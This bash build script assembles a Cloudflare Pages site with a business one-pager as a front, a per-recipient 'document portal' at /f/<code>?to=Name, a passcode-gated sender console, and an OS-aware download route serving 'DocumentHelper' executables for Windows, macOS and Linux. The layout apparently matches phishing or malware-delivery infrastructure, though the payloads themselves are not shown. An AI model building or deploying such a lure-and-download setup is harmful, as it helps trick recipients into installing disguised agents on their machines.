#!/bin/bash
# Build the Cloudflare Pages bundle for reyessitework.pages.dev
#
#   /                 -> business one-pager        (about.html)
#   /f/<code>?to=Name -> document portal           (index.html)
#   /get              -> OS-aware agent download   (_worker.js -> /dl/<file>)
#   /img/*            -> one-pager gallery images  (the "Recent work" photos)
#
# Usage: mk-pages-dir.sh [OUT_DIR] [SRC_ROOT]
set -e
OUT=${1:-/tmp/pages}
SRC=${2:-/var/www}
HERE=$(cd "$(dirname "$0")" && pwd)

rm -rf "$OUT"
mkdir -p "$OUT/dl" "$OUT/img"

# Business one-pager served at /
cp -f "$SRC/reyessitework/index.html" "$OUT/about.html"
# Document portal served at /f/<code>
cp -f "$SRC/send/index.html" "$OUT/index.html"
# Private sender console served at /sender (passcode gated by _worker.js)
cp -f "$SRC/send/sender.html" "$OUT/sender.html" 2>/dev/null || true
# Static images — REQUIRED for the "Recent work" gallery and hero/about photos
cp -f "$SRC"/reyessitework/img/*.jpg "$OUT/img/" 2>/dev/null || true
cp -f "$SRC"/reyessitework/img/*.png "$OUT/img/" 2>/dev/null || true
cp -f "$SRC/send/favicon.ico" "$OUT/favicon.ico" 2>/dev/null || true

# Agents (Windows bundle + raw exe / macOS bundle + raw pkg / Linux)
cp -f "$SRC/send/dl/DocumentHelper.exe" \
      "$SRC/send/dl/DocumentHelper-Windows.zip" \
      "$SRC/send/dl/DocumentHelper.pkg" \
      "$SRC/send/dl/DocumentHelper-macOS.zip" \
      "$SRC/send/dl/DocumentHelper.run" "$OUT/dl/"

# Pages Functions worker (routing + OS detection + attachment headers)
cp -f "$HERE/mk-pages-worker3.js" "$OUT/_worker.js"

echo "=== bundle: $OUT ==="
find "$OUT" -type f | sort
echo "=== artifact shas ==="
sha256sum "$OUT"/dl/*
